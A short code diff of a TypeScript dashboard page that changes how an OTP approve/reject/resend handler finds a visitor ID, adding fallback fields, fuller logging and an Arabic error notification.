@@ -220,12 +220,16 @@ export default function DashboardPage() {
   };
 
   const handleOtpAction = async (action: "approved" | "rejected" | "resend") => {
-    const visitorId = selectedRequest?.visitorId || selectedRequest?.id;
-    console.log("[DASHBOARD] handleOtpAction - visitorId:", visitorId, "selectedRequest:", selectedRequest);
+    // Get visitorId from multiple possible sources
+    const visitorId = selectedRequest?.visitorId || selectedRequest?.id || selectedRequest?.raw?.visitorId || selectedRequest?.raw?.id;
+    console.log("[DASHBOARD] handleOtpAction - visitorId:", visitorId, "selectedRequest:", JSON.stringify(selectedRequest));
+    
     if (!visitorId) {
-      console.log("[DASHBOARD] No visitorId found, cannot process action");
+      console.log("[DASHBOARD] No visitorId found in selectedRequest:", selectedRequest);
+      showNotification("error", "لم يتم العثور على بيانات الزائر");
       return;
     }
+    
     setActionLoading("otp");
     try {
       const res = await fetch("/api/dashboard/otp-action", {
